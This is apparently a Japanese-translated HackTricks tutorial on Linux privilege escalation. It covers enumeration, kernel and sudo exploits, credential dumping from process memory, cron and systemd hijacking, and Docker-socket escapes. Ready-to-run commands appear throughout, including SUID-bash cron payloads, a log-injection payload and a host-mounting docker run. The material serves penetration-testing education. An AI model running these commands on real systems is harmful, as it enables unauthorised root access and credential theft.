# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS情報

稼働中のOSの情報を収集しましょう。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### PATH

もし**`PATH`変数内の任意のフォルダに対して書き込み権限がある**場合、いくつかのライブラリやバイナリをハイジャックできる可能性があります:
```bash
echo $PATH
```
### Env info

環境変数に興味深い情報、パスワード、またはAPIキーはありますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel version を確認し、escalate privileges に使用できる exploit があるかどうか確認する。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
良い脆弱な kernel リストと既に **compiled exploits** が見つかるのはここです: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Other sites where you can find some **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのウェブサイトからすべての脆弱な kernel バージョンを抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
カーネルエクスプロイトを検索するのに役立つツールは次のとおりです:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (被害者上で実行、カーネル2.x向けのエクスプロイトのみをチェックします)

常に **カーネルのバージョンをGoogleで検索** してください。あなたのカーネルのバージョンが何らかの kernel exploit に記載されている可能性があり、そうすればその exploit が有効であることを確信できます。

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo のバージョン

以下に表示される脆弱な Sudo のバージョンに基づいて:
```bash
searchsploit sudo
```
この grep を使用して sudo のバージョンが脆弱かどうかを確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

作成者: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 署名検証に失敗しました

**smasher2 box of HTB** を確認して、この vuln がどのように悪用され得るかの **例** を参照してください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### 追加のシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 考えられる防御策

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

もし docker container の中にいる場合、そこから脱出を試みることができます:

{{#ref}}
docker-security/
{{#endref}}

## ドライブ

どこで、なぜ、**何がマウントされていて何がアンマウントされているか**を確認してください。アンマウントされているものがあれば、それをマウントして機密情報がないか確認してみてください。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**任意のコンパイラがインストールされているかどうか**を確認してください。kernel exploit を使う必要がある場合、実際に使用するマシン（または類似のマシン）でコンパイルすることが推奨されるため、これは有用です。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアがインストールされている

インストールされているパッケージやサービスの**バージョン**を確認してください。例えば古い Nagios バージョンが存在し、それが exploited for escalating privileges に悪用される可能性があります…\  
より疑わしいインストール済みソフトウェアのバージョンは手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
マシンにSSHでアクセスできる場合は、**openVAS** を使ってマシン内にインストールされているバージョンが古く脆弱なソフトウェアをチェックすることもできます。

> [!NOTE] > _これらのコマンドは大量の情報を表示し、その多くはほとんど役に立ちません。したがって、OpenVAS のようなアプリケーション（または同等のツール）を使用して、インストールされているソフトウェアのバージョンが既知のエクスプロイトに対して脆弱かどうかを確認することをおすすめします。_

## プロセス

実行されている**どのプロセス**を確認し、どのプロセスが**本来必要とするよりも多くの権限を持っているか**をチェックしてください（例：rootで実行されている tomcat など）。
```bash
ps aux
ps -ef
top -n 1
```
常に [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md) が動作していないか確認してください。**Linpeas** はプロセスのコマンドライン内の `--inspect` パラメータをチェックしてそれらを検出します。\
また **プロセスのバイナリに対する自分の権限も確認**してください。誰かのバイナリを上書きできるかもしれません。

### プロセス監視

プロセスを監視するために [**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使えます。これは、脆弱なプロセスが頻繁に実行されている場合や特定の条件が満たされたときにそれらを特定するのに非常に有用です。

### プロセスメモリ

一部のサーバサービスは **メモリ内に平文で認証情報を保存** します。\
通常、他ユーザーに属するプロセスのメモリを読むには **root権限** が必要なため、これは既に root の場合に追加の認証情報を見つけるのに有用です。\
ただし、**通常ユーザーは自分が所有するプロセスのメモリを読むことができる** 点は覚えておいてください。

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: 同じ uid であれば全てのプロセスをデバッグできます。これは従来の ptrace の動作です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみデバッグ可能です。
> - **kernel.yama.ptrace_scope = 2**: ptrace の使用は管理者のみ可能で、CAP_SYS_PTRACE が必要です。
> - **kernel.yama.ptrace_scope = 3**: ptrace でプロセスを追跡することはできません。一度設定すると、ptrace を再び有効にするには再起動が必要です。

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB スクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

特定のプロセスIDに対して、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマップされているかを示し**、また各マップ領域の**権限を示します**。  
**mem** 擬似ファイルは**プロセスのメモリ自体を露出させます**。  
**maps** ファイルから、どの**メモリ領域が読み取り可能**であるかとそのオフセットを知ることができます。  
この情報を使って **mem ファイルを seek し、読み取り可能な全ての領域を dump してファイルに保存します**。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの **物理** メモリにアクセスを提供し、仮想メモリにはアクセスしません。カーネルの仮想アドレス空間は /dev/kmem を使用してアクセスできます。\
通常、`/dev/mem` は **root** と **kmem** グループによってのみ読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump は、Windows 向けの Sysinternals スイートにある古典的な ProcDump ツールを Linux 向けに再構想したものです。入手はこちら: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

プロセスメモリをダンプするには、次を使用できます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_手動でroot要件を削除して、自分が所有するプロセスをダンプできます
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root が必要です)

### Credentials from Process Memory

#### Manual example

authenticator プロセスが実行されているのを見つけたら:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスのメモリをダンプして（前のセクションを参照して、プロセスのメモリをダンプするさまざまな方法を確認してください）メモリ内で資格情報を検索できます:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

このツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、メモリから**平文の認証情報を盗み**、いくつかの**既知のファイル**からも取得します。正常に動作させるにはroot権限が必要です。

| 機能                                           | プロセス名         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

スケジュールされたジョブに脆弱性がないか確認してください。root によって実行されるスクリプトを利用できるかもしれません（wildcard vuln? root が使用するファイルを変更できるか? symlinks を使う? root が使用するディレクトリに特定のファイルを作成する?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### CronのPATH

例えば、_/etc/crontab_ の中には PATH が見つかります: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_user が /home/user に書き込み権限を持っている点に注目_)

この crontab の中で root ユーザが PATH を設定せずにコマンドやスクリプトを実行しようとする場合。例えば: _\* \* \* \* root overwrite.sh_\
すると、次を使って root シェルを取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### ワイルドカードを含むスクリプトを Cron が実行する場合 (Wildcard Injection)

スクリプトが root によって実行され、コマンド内に “**\***” が含まれている場合、予期しない動作（例：privesc）を引き起こすように悪用できます。例:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**ワイルドカードが次のようなパスの前にある場合** _**/some/path/\***_ **、脆弱ではありません（さらに** _**./\***_ **も同様です）。**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.

- Why it works: Bash では展開は次の順序で行われます：parameter/variable expansion、command substitution、arithmetic expansion、そして word splitting と pathname expansion。したがって `$(/bin/bash -c 'id > /tmp/pwn')0` のような値はまず置換され（コマンドが実行され）、残った数値の `0` が算術演算に使われるためスクリプトはエラーにならずに続行されます。

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: 攻撃者が制御するテキストを解析対象のログに書き込み、数値っぽく見えるフィールドにコマンド置換を含め末尾を数字にすると悪用できます。算術が有効であり続けるよう、コマンドは stdout に何も出力しない（またはリダイレクトする）ようにしてください。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root によって実行される script が、あなたがフルアクセスできる **directory** を使用している場合、そのフォルダを削除して、あなたが制御するスクリプトを提供する別のフォルダを指す **symlink folder** を作成するのが有効かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 頻繁に実行される cron ジョブ

プロセスを監視して、1分、2分、または5分ごとに実行されているプロセスを探すことができます。それを利用して権限を昇格できるかもしれません。

例えば、**0.1秒間隔で1分間監視する**、**実行回数の少ない順にソートする**、および最も多く実行されたコマンドを削除するには、次のように実行できます:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**次も使えます** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（これは起動するすべての process を監視して一覧表示します）。

### 見えない cron jobs

cronjob を作成する際、**コメントの後に carriage return を入れる**（newline character を入れない）ことで、cron job が動作します。例（carriage return char に注意）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込みできるか確認してください。書き込みできる場合、サービスが **開始**、**再起動**、または **停止** されたときにあなたの **backdoor** を **実行する** ように **変更できます**（マシンを再起動するまで待つ必要があるかもしれません）。\
例えば、.service ファイル内に **`ExecStart=/tmp/script.sh`** を指定してあなたの backdoor を作成します。

### 書き込み可能な service バイナリ

サービスによって実行されるバイナリに対する **書き込み権限を持っている場合**、それらを書き換えて backdoor を仕込むことができ、サービスが再実行されたときに backdoor が実行されます。

### systemd PATH - 相対パス

**systemd** が使用する PATH は次で確認できます:
```bash
systemctl show-environment
```
パス内のいずれかのフォルダに**write**できると判明した場合、**escalate privileges**できる可能性があります。サービス設定ファイルで**relative paths being used on service configurations**のような記述を検索する必要があります:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能な systemd PATH フォルダ内に、相対パスのバイナリと同じ名前の **executable** を作成し、サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）を実行するよう要求されたときに、あなたの **backdoor** が実行されます（特権のないユーザーは通常サービスを start/stop できませんが、`sudo -l` を使えるか確認してください）。

**サービスについては `man systemd.service` を参照してください。**

## **Timers**

**Timers** は名前が `**.timer**` で終わる systemd ユニットファイルで、`**.service**` ファイルやイベントを制御します。 **Timers** はカレンダー時間イベントや単調時間イベントをネイティブでサポートし、非同期で実行できるため、cron の代替として利用できます。

すべてのタイマーは次のコマンドで列挙できます:
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを変更できる場合、systemd.unit の既存のユニット（例: `.service` や `.target`）を実行させることができます。
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> このタイマーが満了したときにアクティブ化される unit。引数は接尾辞が ".timer" ではないユニット名です。指定されていない場合、この値はタイマー・ユニットと同じ名前（接尾辞を除く）を持つ service にデフォルトで設定されます（上参照）。アクティブ化されるユニット名とタイマー・ユニットのユニット名は、接尾辞を除いて同一にすることが推奨されます。

Therefore, to abuse this permission you would need to:

- Find some systemd unit (like a `.service`) that is **書き込み可能なバイナリを実行している**
- Find some systemd unit that is **相対パスを実行している** and you have **書き込み権限** over the **systemd PATH** (その実行ファイルを偽装するため)

**タイマーについては `man systemd.timer` を参照してください。**

### **タイマーの有効化**

タイマーを有効にするには root 権限が必要で、次のコマンドを実行します:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## ソケット

Unix Domain Sockets (UDS) は、クライアント-サーバモデル内で同一または異なるマシン間の**プロセス間通信**を可能にします。これらは標準の Unix ファイルディスクリプタを利用してコンピュータ間通信を行い、`.socket` ファイルを通じて設定されます。

ソケットは `.socket` ファイルで構成できます。

**Learn more about sockets with `man systemd.socket`.** このファイル内では、いくつか興味深いパラメータを設定できます:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは異なりますが、要約すると **どこでリッスンするかを示す**（AF_UNIX ソケットファイルのパス、リッスンする IPv4/6 やポート番号など）ためのものです。
- `Accept`: 真偽値を取ります。`**true**` の場合、**各着信接続ごとにサービスインスタンスが生成され**、接続ソケットのみがそれに渡されます。`**false**` の場合、すべてのリスニングソケット自体が **起動された service unit に渡され**、すべての接続に対して単一の service unit が生成されます。この値は datagram ソケットや FIFO では無視され、単一の service unit が一律にすべての着信トラフィックを処理します。**Defaults to false**。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した方法でのみ書くことが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1 行以上のコマンドラインを取り、リスニング **ソケット**/FIFO が **作成およびバインドされる前** または **後** に実行されます。コマンドラインの最初のトークンは絶対パスでなければならず、その後にプロセスの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: リスニング **ソケット**/FIFO が **クローズおよび削除される前** または **後** に実行される追加の **コマンド** です。
- `Service`: 着信トラフィック時に **アクティブ化する** `service` ユニット名を指定します。この設定は Accept=no のソケットでのみ許可されます。デフォルトはソケットと同名（サフィックスを置換）の service です。ほとんどの場合、このオプションを使う必要はありません。

### 書き込み可能な .socket ファイル

もし **書き込み可能な** `.socket` ファイルを見つけたら、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のような行を**追加**でき、バックドアはソケットが作成される前に実行されます。したがって、**おそらくマシンの再起動を待つ必要があります。**\
_システムがそのソケットファイルの設定を実際に使用していないと、バックドアは実行されない点に注意してください_

### 書き込み可能なソケット

もし **書き込み可能なソケットを特定できれば**（ここで言うのは設定ファイルの `.socket` ではなく Unix ソケット自体です）、そのソケットと**通信する**ことができ、脆弱性を利用できる可能性があります。

### Unix ソケットの列挙
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

一部に**sockets listening for HTTP** requestsがあることに注意してください (_ここで言っているのは .socket ファイルではなく、unix sockets として動作するファイルのことです_)。以下のコマンドで確認できます:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
もしソケットが **HTTP に応答する** リクエストであれば、**通信** が可能になり、場合によっては **脆弱性を exploit** できるかもしれません。

### 書き込み可能な Docker Socket

Docker ソケットは通常 `/var/run/docker.sock` にあり、保護すべき重要なファイルです。デフォルトでは `root` ユーザーおよび `docker` グループのメンバーが書き込み可能です。このソケットへの書き込み権限を持つと privilege escalation を引き起こす可能性があります。以下はその実行方法の内訳と、Docker CLI が利用できない場合の代替手段です。

#### **Privilege Escalation with Docker CLI**

もし Docker socket に書き込みアクセスがある場合、以下のコマンドを使って escalate privileges が可能です：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドを使うと、ホストのファイルシステムに対して root レベルのアクセスを持つコンテナを実行できます。

#### **Using Docker API Directly**

Docker CLI が利用できない場合でも、Docker API と `curl` コマンドを使って Docker ソケットを操作できます。

1.  **List Docker Images:** 利用可能なイメージの一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストシステムのルートディレクトリをマウントするコンテナを作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

新しく作成したコンテナを起動します:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` を使ってコンテナに接続を確立し、コマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 接続を設定した後、コンテナ内で直接コマンドを実行し、ホストのファイルシステムに対して root 権限でアクセスできます。

### その他

docker グループの中にいる（**inside the group `docker`**）ために docker ソケットへの書き込み権限がある場合、[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) が利用可能になる点に注意してください。もし [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) ならば、それを悪用できる可能性もあります。

docker からの脱出や権限昇格のための悪用方法の詳細は、次を参照してください：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

もし **`ctr`** コマンドを使用できることが分かった場合、以下のページを参照してください。**権限昇格に悪用できる可能性があります**：


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

もし **`runc`** コマンドを使用できることが分かった場合、以下のページを参照してください。**権限昇格に悪用できる可能性があります**：


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は高度な inter-Process Communication (IPC) system で、アプリケーション間の効率的な相互作用やデータ共有を可能にします。モダンな Linux システムを念頭に設計されており、様々な形のアプリケーション通信に対する堅牢なフレームワークを提供します。

このシステムは柔軟で、プロセス間のデータ交換を強化する基本的な IPC（いわば **enhanced UNIX domain sockets** に類似）をサポートします。さらに、イベントやシグナルのブロードキャストを助け、システムコンポーネント間のシームレスな統合を促進します。例えば、Bluetooth デーモンからの着信通話に関するシグナルが音楽プレーヤーをミュートさせる、というようなユーザー体験の向上が可能です。加えて、D-Bus はリモートオブジェクトシステムをサポートし、アプリケーション間でのサービス要求やメソッド呼び出しを簡素化し、従来は複雑だったプロセスを効率化します。

D-Bus は許可/拒否モデル（allow/deny model）で動作し、ポリシールールの積み重ねに基づいてメッセージの許可（メソッド呼び出し、シグナル送出など）を管理します。これらのポリシーはバスとのやり取りを指定し、許可の誤設定を悪用することで権限昇格につながる可能性があります。

例として、/etc/dbus-1/system.d/wpa_supplicant.conf にあるポリシーが示されており、root が fi.w1.wpa_supplicant1 を所有し、そのメッセージを送受信できるようにする権限が記載されています。

ユーザーやグループが指定されていないポリシーは全員に適用され、一方で "default" コンテキストのポリシーは他の特定のポリシーに含まれない全てのエンティティに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここで D-Bus の通信を enumerate および exploit する方法を学ぶ:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを enumerate して、マシンの位置を把握するのは常に興味深い。

### 一般的な enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

アクセスする前にやり取りできなかったマシン上で動作しているネットワークサービスを常に確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

トラフィックをsniffできるか確認してください。sniffできれば、いくつかのcredentialsを取得できる可能性があります。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

システム上で自分が**who**なのか、どの**privileges**を持っているか、どの**users**が存在するか、どのアカウントが**login**でき、どのアカウントが**root privileges**を持っているかを確認してください：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大きな UID

一部の Linux バージョンは、**UID > INT_MAX** のユーザーが権限昇格できるバグの影響を受けていました。詳細: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)、および [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### グループ

root 権限を付与する可能性のあるグループの**メンバーかどうか**を確認する:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### クリップボード

可能であれば、クリップボードに興味深いものが入っていないか確認する
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

